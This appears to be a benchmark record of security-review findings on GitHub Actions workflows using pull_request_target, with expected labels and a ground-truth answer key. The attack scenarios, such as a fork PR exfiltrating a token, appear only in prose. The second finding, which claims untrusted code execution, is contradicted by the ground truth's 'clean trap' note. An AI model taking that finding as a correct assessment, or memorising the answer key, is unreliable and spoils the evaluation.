findings.body: Injecting `RELEASE_TOKEN` into the environment of a step that executes code from an untrusted PR branch (due to the `pull_request_target` + head-SHA checkout combination) means any malicious PR can read and exfiltrate this secret. Secrets should never be passed to steps that run attacker-controlled code.
findings.failure_scenario: A malicious PR modifies a test script to log or exfiltrate `process.env.RELEASE_TOKEN`. Because the secret is injected into the environment of the step running the PR's code, the attacker obtains the token.
findings.title: Secret exposed to untrusted code in pull_request_target workflow

expected.label: pull_request_target executes untrusted head with a secret

findings.body: Switching from pull_request to pull_request_target causes the workflow to run in the context of the base repository with write permissions and access to secrets. The actions/checkout@v4 step on line 9 will check out the pull request's head ref (untrusted code from a fork) in this elevated context. If any subsequent step executes code from that checkout (or if the labeler action itself processes files from the repo), an attacker can exfiltrate secrets or write to the repository.
findings.failure_scenario: An attacker opens a PR from a fork containing a malicious .github/labeler.yml or other workflow-influencing file. Because pull_request_target runs with the base repo's GITHUB_TOKEN (which has pull-requests: write here) and checks out the attacker's head ref, the attacker-controlled content is executed or processed with elevated permissions, potentially allowing label manipulation, secret exfiltration, or repository compromise.
findings.title: pull_request_target with checkout of untrusted code enables code execution

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1
